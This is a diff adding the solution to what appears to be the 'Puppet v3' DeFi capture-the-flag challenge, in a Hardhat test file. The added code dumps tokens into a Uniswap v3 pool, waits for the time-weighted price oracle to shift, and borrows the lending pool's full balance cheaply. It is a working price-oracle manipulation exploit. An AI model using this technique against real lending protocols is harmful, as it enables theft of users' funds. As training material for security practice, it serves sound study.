@@ -5,6 +5,7 @@ const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers")
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
+const swapRouterJson = require("@uniswap/v3-periphery/artifacts/contracts/SwapRouter.sol/SwapRouter.json");
 
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
@@ -139,7 +140,25 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const swapRouter = new ethers.Contract("0xE592427A0AEce92De3Edee1F18E0157C05861564", swapRouterJson.abi, player);
+        
+        await token.connect(player).approve(swapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await swapRouter.exactInputSingle({
+            tokenIn: token.address,
+            tokenOut: weth.address,
+            fee: 3000,
+            recipient: player.address,
+            deadline: (await ethers.provider.getBlock('latest')).timestamp * 10,
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0,
+        });
+
+        await time.increase(100);
+
+        const wethRequired = await lendingPool.connect(player).calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).approve(lendingPool.address, wethRequired);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
